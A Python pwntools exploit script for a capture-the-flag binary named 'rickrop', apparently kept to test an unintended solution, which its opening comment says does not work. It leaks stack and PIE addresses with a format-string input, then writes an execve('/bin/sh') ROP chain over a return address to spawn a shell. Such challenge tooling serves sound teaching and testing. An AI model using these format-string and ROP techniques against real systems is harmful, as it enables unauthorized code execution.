#!/usr/bin/python3.7

# This does not work, it's just here to check for one possible unintended solution

from pwn import *
import os

os.chdir('../setup')
elf = context.binary = ELF("rickrop")
context.terminal = ['tilix', '-a', 'app-new-session', '-e']
gs = '''
init-pwndbg
set breakpoint pending on
b *echo+112
b *echo+159
c
'''

# wrapper functions
def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x): return io.recvuntil(x)
def rl(): return io.recvline()
def cl(): io.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])
def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))


HOST = args.HOST or '192.168.125.12'
PORT = args.PORT or 3337

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        return remote(HOST, PORT)
    elif args.LR:
        return remote('127.0.0.1', PORT)
    else:
        return process(elf.path)


io = run()


# =-=-=-=-=-=-=-=-=-= Main Exploit -=-=-=-=-=-=-=-=

#  =-=-=- Get leaks =-=-=-=-
offset_stack = 0x1f740  # - 0x50 without GDB, needed ?
offset_pie = 0x50f7e
offset_ret_echo = 0x1fb58 - 0x300

ru(b'Sometimes ROP is more art than science\n')
sl(b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%pend')

#print(ru(b'end').split(b'.'))
leaks = ru(b'end').split(b'.')

STACK = int(leaks[0], 16) - offset_stack
elf.address = int(leaks[2], 16) - offset_pie
RET_ECHO = STACK + offset_ret_echo

log_addr('Stack: ', STACK)
log_addr('PIE: ', elf.address)
log_addr('echo() ret addr: ', RET_ECHO)


#  =-=-=- Write and win =-=-=-=-

# Gadgets / addresses
rop = ROP(elf)

ropchain = RET_ECHO - 0x98
BINSH = elf.address + elf.get_section_by_name('.data').header.sh_addr

POP_RAX = rop.find_gadget(['pop rax', 'ret']).address
POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
POP_RSI = rop.find_gadget(['pop rsi', 'ret']).address
POP_RDX = rop.find_gadget(['pop rdx', 'ret']).address
POP_RDX = rop.find_gadget(['pop rdx', 'ret']).address
SYSCALL = rop.find_gadget(['syscall']).address

# mov qword ptr [rsi], rax ; ret
MOV_PTR_RSI_RAX = elf.address + 0x87e21

# xor rax, rax ; ret
XOR_RAX = elf.address + 0x4c2c0

# pop rsp ; ret
pivot = rop.find_gadget(['pop rsp', 'ret']).address

# execve() chain
chain = [
    POP_RSI,
    BINSH,
    POP_RAX,
    0x68732f6e69622f,
    MOV_PTR_RSI_RAX,
    XOR_RAX,
    POP_RAX,
    0x3b,
    POP_RDI,
    BINSH,
    POP_RSI,
    0,
    POP_RDX,
    0,
    SYSCALL
]

# overwrite echo() ret addr and send execve() rop chain
writes = {}
for i in range(len(chain)):
    writes[RET_ECHO + (8 * i)] = chain[i]

payload = fmtstr_payload(8, writes, write_size='short')

log.info(f'len: {len(payload)}')
log.info(repr(payload))
sl(payload)

io.interactive()
